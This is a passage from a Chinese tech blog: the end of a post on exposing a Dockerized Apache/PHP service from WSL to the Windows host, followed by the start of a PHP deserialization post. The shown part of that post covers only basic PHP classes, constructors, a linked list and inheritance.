<p>此时新容器就创建好了,可以看到PORTS栏目里面,wsl的10011端口已经映射给了docker的80端口,其上运行了一个tcp服务</p>
<h4 id="访问容器">访问容器</h4>
<p>怎么访问这个容器呢?</p>
<p>访问这个容器就是访问wsl的10011号端口,可以使用<code>ip:port</code>方式进行访问</p>
<p>在wsl上使用ifconfig看一下wsl的ip地址是多少</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">root@Executor:~# ifconfig</span><br><span class="line">docker0: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500</span><br><span class="line">        inet 172.17.0.1  netmask 255.255.0.0  broadcast 172.17.255.255</span><br><span class="line">        inet6 fe80::42:86ff:feaf:17dc  prefixlen 64  scopeid 0x20&lt;<span class="built_in">link</span>&gt;</span><br><span class="line">        ether 02:42:86:af:17:dc  txqueuelen 0  (Ethernet)</span><br><span class="line">        RX packets 45  bytes 26682 (26.6 KB)</span><br><span class="line">        RX errors 0  dropped 0  overruns 0  frame 0</span><br><span class="line">        TX packets 50  bytes 5382 (5.3 KB)</span><br><span class="line">        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0</span><br><span class="line"></span><br><span class="line">eth0: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500</span><br><span class="line">        inet 172.31.174.19  netmask 255.255.240.0  broadcast 172.31.175.255</span><br><span class="line">        inet6 fe80::215:5dff:fe99:9ce8  prefixlen 64  scopeid 0x20&lt;<span class="built_in">link</span>&gt;</span><br><span class="line">        ether 00:15:5d:99:9c:e8  txqueuelen 1000  (Ethernet)</span><br><span class="line">        RX packets 613  bytes 86373 (86.3 KB)</span><br><span class="line">        RX errors 0  dropped 0  overruns 0  frame 0</span><br><span class="line">        TX packets 304  bytes 90966 (90.9 KB)</span><br><span class="line">        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0</span><br></pre></td></tr></table></figure>
<p>发现wsl在windows主机NAT后面的ip地址是<code>172.31.174.19</code></p>
<p>虽然wsl和windows主机之间的网络模式是NAT模式,与windows主机同路由器局域网内的其他设备是无法访问wsl的,</p>
<p>但是windows主机是可以访问wsl的,windows主机相对于wsl就是"外网环境",我们只需要在windows主机浏览器上访问<code>172.31.174.19:10011</code></p>
<p>或者windows主机上<code>curl 172.31.174.19:10011/info.php</code></p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220724204301206.png"
alt="image-20220724204301206" />
<figcaption aria-hidden="true">image-20220724204301206</figcaption>
</figure>
<p>可以看见,windows主机是可以访问docker容器的apache2服务的</p>
<blockquote>
<p>站在windows主机的角度,怎样看出这是一个docker容器提供的apache2服务,而不是wsl提供的apache2服务呢?</p>
<p>从该phpinfo的回显结果可以隐约看出这是一个docker容器提供的服务</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220724204601250.png"
alt="image-20220724204601250" />
<figcaption aria-hidden="true">image-20220724204601250</figcaption>
</figure>
<p>首先这个System名,谁会起一个edc1b61f6c7a作为主机名啊?这个数是一个docker容器id</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@Executor:~# docker ps -a</span><br><span class="line">CONTAINER ID   IMAGE           COMMAND                  CREATED          STATUS          PORTS                                     NAMES</span><br><span class="line">edc1b61f6c7a   apache/ubuntu   <span class="string">&quot;docker-php-entrypoi…&quot;</span>   12 minutes ago   Up 11 minutes   0.0.0.0:10011-&gt;80/tcp, :::10011-&gt;80/tcp   friendly_northcutt</span><br></pre></td></tr></table></figure>
<p>其次,后面的configuration-&gt;apache2handler中</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220724204736232.png"
alt="image-20220724204736232" />
<figcaption aria-hidden="true">image-20220724204736232</figcaption>
</figure>
<p>这里ip地址和端口号均与wsl不一样,如果是wsl直接提供apache2服务,这里应是<code>172.31.174.19:80</code></p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">deb http://mirrors.aliyun.com/ubuntu/ bionic main restricted universe multiverse</span><br><span class="line">deb http://mirrors.aliyun.com/ubuntu/ bionic-security main restricted universe multiverse</span><br><span class="line">deb http://mirrors.aliyun.com/ubuntu/ bionic-updates main restricted universe multiverse</span><br><span class="line">deb http://mirrors.aliyun.com/ubuntu/ bionic-proposed main restricted universe multiverse</span><br><span class="line">deb http://mirrors.aliyun.com/ubuntu/ bionic-backports main restricted universe multiverse</span><br><span class="line">deb-src http://mirrors.aliyun.com/ubuntu/ bionic main restricted universe multiverse</span><br><span class="line">deb-src http://mirrors.aliyun.com/ubuntu/ bionic-security main restricted universe multiverse</span><br><span class="line">deb-src http://mirrors.aliyun.com/ubuntu/ bionic-updates main restricted universe multiverse</span><br><span class="line">deb-src http://mirrors.aliyun.com/ubuntu/ bionic-proposed main restricted universe multiverse</span><br><span class="line">deb-src http://mirrors.aliyun.com/ubuntu/ bionic-backports main restricted universe multiverse</span><br></pre></td></tr></table></figure>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://deutschball.github.io/2022/07/21/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="https://raw.githubusercontent.com/DeutschBall/picbed/main/dustball.png">
      <meta itemprop="name" content="dustball">
      <meta itemprop="description" content="dustland">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="dustland">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/07/21/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" class="post-title-link" itemprop="url">php反序列化漏洞</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2022-07-21 03:28:00 / Modified: 03:37:50" itemprop="dateCreated datePublished" datetime="2022-07-21T03:28:00+08:00">2022-07-21</time>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="php反序列化">php反序列化</h1>
<p>反序列化unserialize和序列化serialize是一对互逆的操作</p>
<p>对象经过序列化成为字符串</p>
<p>满足条件的字符串经过反序列化成为对象</p>
<p>需要了解一下php面向对象</p>
<h2 id="php面向对象基础">php面向对象基础</h2>
<h3 id="类">类</h3>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Site</span> </span>&#123;</span><br><span class="line">  <span class="comment">/* 成员变量 */</span></span><br><span class="line">  <span class="keyword">var</span> <span class="variable">$domain</span>;</span><br><span class="line">  <span class="keyword">var</span> <span class="variable">$title</span>;</span><br><span class="line">  </span><br><span class="line">  <span class="comment">/* 成员函数 */</span></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">setDomain</span>(<span class="params"><span class="variable">$par</span></span>)</span>&#123;<span class="comment">//setter方法</span></span><br><span class="line">     <span class="variable language_">$this</span>-&gt;domain = <span class="variable">$par</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">getDomain</span>(<span class="params"></span>)</span>&#123;<span class="comment">//getter方法</span></span><br><span class="line">    <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;domain;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">setTitle</span>(<span class="params"><span class="variable">$par</span></span>)</span>&#123;</span><br><span class="line">     <span class="variable language_">$this</span>-&gt;title = <span class="variable">$par</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">getTitle</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;title;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$mySite</span>=<span class="keyword">new</span> <span class="title class_">Site</span>;<span class="comment">//实例化</span></span><br><span class="line"><span class="variable">$mySite</span>-&gt;<span class="title function_ invoke__">setTitle</span>(<span class="string">&quot;the empire&quot;</span>);<span class="comment">//调用成员函数</span></span><br><span class="line"><span class="variable">$mySite</span>-&gt;<span class="title function_ invoke__">setDomain</span>(<span class="string">&quot;www.dustball.top&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$mySite</span>-&gt;<span class="title function_ invoke__">getDomain</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$mySite</span>-&gt;<span class="title function_ invoke__">getTitle</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<h3 id="构造函数析构函数">构造函数&amp;析构函数</h3>
<p>在使用new关键字实例化对象的时候,会自动调用构造函数,如果不显式声明则默认有一个啥也不干的缺省构造函数</p>
<p>当对象生命期结束时,系统自动执行其析构函数.如果不显式声明则默认有一个啥也不干的缺省析构函数</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> <span class="title function_ invoke__">__construct</span> ([ <span class="keyword">mixed</span> <span class="variable">$args</span> [, $... ]] )</span><br><span class="line"><span class="keyword">void</span> <span class="title function_ invoke__">__destruct</span> ( <span class="keyword">void</span> )</span><br></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Site</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="comment">/* 成员变量 */</span></span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$domain</span>;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$title</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 成员函数 */</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">setDomain</span>(<span class="params"><span class="variable">$par</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;domain = <span class="variable">$par</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">getDomain</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;domain;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">setTitle</span>(<span class="params"><span class="variable">$par</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;title = <span class="variable">$par</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">getTitle</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;title;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$par1</span> = <span class="number">0</span>, <span class="variable">$par2</span> = <span class="number">0</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;<span class="comment">//缺省参数</span></span><br><span class="line">        <span class="variable language_">$this</span>-&gt;domain = <span class="variable">$par1</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;title = <span class="variable">$par2</span>;</span><br><span class="line">        <span class="keyword">print</span> <span class="variable language_">$this</span>-&gt;title . <span class="string">&quot; rise\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">print</span> <span class="variable language_">$this</span>-&gt;title . <span class="string">&quot; fall\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$mySite</span> = <span class="keyword">new</span> <span class="title class_">Site</span>(<span class="string">&quot;deutschball.github.io&quot;</span>, <span class="string">&quot;the republic&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>运行结果</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">the republic rise</span><br><span class="line">the republic fall</span><br></pre></td></tr></table></figure>
<h3 id="引用">引用</h3>
<p>php中,函数传参时,对象类型默认为引用传递</p>
<p>比如实现一个链表类:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">LinkedNode</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$value</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$next</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$v</span>=<span class="number">0</span>,<span class="variable">$n</span>=<span class="literal">NULL</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;value=<span class="variable">$v</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;next=<span class="variable">$n</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">setValue</span>(<span class="params"><span class="variable">$v</span>=<span class="number">0</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;value=<span class="variable">$v</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getValue</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;value;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">setNext</span>(<span class="params"><span class="variable">$n</span>=<span class="literal">NULL</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;next=<span class="variable">$n</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getNext</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">LinkedList</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$head</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;head=<span class="keyword">new</span> <span class="title class_">LinkedNode</span>(<span class="number">0</span>,<span class="literal">NULL</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">isEmpty</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;head-&gt;<span class="title function_ invoke__">getNext</span>()==<span class="literal">NULL</span>)<span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">insertHead</span>(<span class="params"><span class="variable">$v</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$node</span>=<span class="keyword">new</span> <span class="title class_">LinkedNode</span>(<span class="variable">$v</span>,<span class="variable language_">$this</span>-&gt;head-&gt;<span class="title function_ invoke__">getNext</span>());</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;head-&gt;<span class="title function_ invoke__">setNext</span>(<span class="variable">$node</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getHead</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">isEmpty</span>())<span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;head-&gt;<span class="title function_ invoke__">getNext</span>()-&gt;<span class="title function_ invoke__">getValue</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">deleteHead</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">isEmpty</span>())<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;head-&gt;<span class="title function_ invoke__">setNext</span>(<span class="variable">$this</span>-&gt;head-&gt;<span class="title function_ invoke__">getNext</span>()-&gt;<span class="title function_ invoke__">getNext</span>());</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$p</span>=<span class="variable language_">$this</span>-&gt;head;</span><br><span class="line">        <span class="keyword">while</span>(<span class="variable">$p</span>-&gt;<span class="title function_ invoke__">getNext</span>()!=<span class="literal">NULL</span>)&#123;</span><br><span class="line">            <span class="variable">$p</span>=<span class="variable">$p</span>-&gt;<span class="title function_ invoke__">getNext</span>();</span><br><span class="line">            <span class="keyword">print</span> <span class="variable">$p</span>-&gt;<span class="title function_ invoke__">getValue</span>().<span class="string">&quot;  &quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$linkedlist</span>=<span class="keyword">new</span> <span class="title class_">LinkedList</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">1</span>;<span class="variable">$i</span>&lt;=<span class="number">10</span>;++<span class="variable">$i</span>)&#123;</span><br><span class="line">    <span class="variable">$linkedlist</span>-&gt;<span class="title function_ invoke__">insertHead</span>(<span class="variable">$i</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$linkedlist</span>();</span><br><span class="line"><span class="keyword">while</span>(!<span class="variable">$linkedlist</span>-&gt;<span class="title function_ invoke__">isEmpty</span>())&#123;</span><br><span class="line">    <span class="keyword">print</span> <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    <span class="variable">$linkedlist</span>-&gt;<span class="title function_ invoke__">deleteHead</span>();</span><br><span class="line">    <span class="variable">$linkedlist</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<h3 id="继承">继承</h3>
<p>继承关键字extends,php不支持多继承</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Child</span> <span class="keyword">extends</span> <span class="title">Parent</span> </span>&#123;</span><br><span class="line">   <span class="comment">// 代码部分</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>子类构造函数不会主动调用父类的构造函数,可以使用<code>parent::__construct()</code>显式调用</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Site</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="comment">/* 成员变量 */</span></span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$domain</span>;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$title</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 成员函数 */</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">setDomain</span>(<span class="params"><span class="variable">$par</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;domain = <span class="variable">$par</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">getDomain</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;domain;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">setTitle</span>(<span class="params"><span class="variable">$par</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;title = <span class="variable">$par</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">getTitle</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;title;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$par1</span> = <span class="number">0</span>, <span class="variable">$par2</span> = <span class="number">0</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;domain = <span class="variable">$par1</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;title = <span class="variable">$par2</span>;</span><br><span class="line">        <span class="keyword">print</span> <span class="variable language_">$this</span>-&gt;title . <span class="string">&quot; rise\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">print</span> <span class="variable language_">$this</span>-&gt;title . <span class="string">&quot; fall\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$mySite</span> = <span class="keyword">new</span> <span class="title class_">Site</span>(<span class="string">&quot;deutschball.github.io&quot;</span>, <span class="string">&quot;the republic&quot;</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Child_Site</span> <span class="keyword">extends</span> <span class="title">Site</span></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$icon_domain</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$par1</span> = <span class="number">0</span>, <span class="variable">$par2</span> = <span class="number">0</span>,<span class="variable">$par3</span> =<span class="number">0</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="built_in">parent</span>::<span class="title function_ invoke__">__construct</span>(<span class="variable">$par1</span>,<span class="variable">$par2</span>);<span class="comment">//parent::指向父类成员</span></span><br><span class="line">        <span class="variable language_">$this</span>-&gt;icon_domain=<span class="variable">$par3</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="built_in">parent</span>::<span class="title function_ invoke__">__destruct</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">setIconDomain</span>(<span class="params"><span class="variable">$idomain</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;icon_domain=idomain;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">getIconDomain</span>(<span 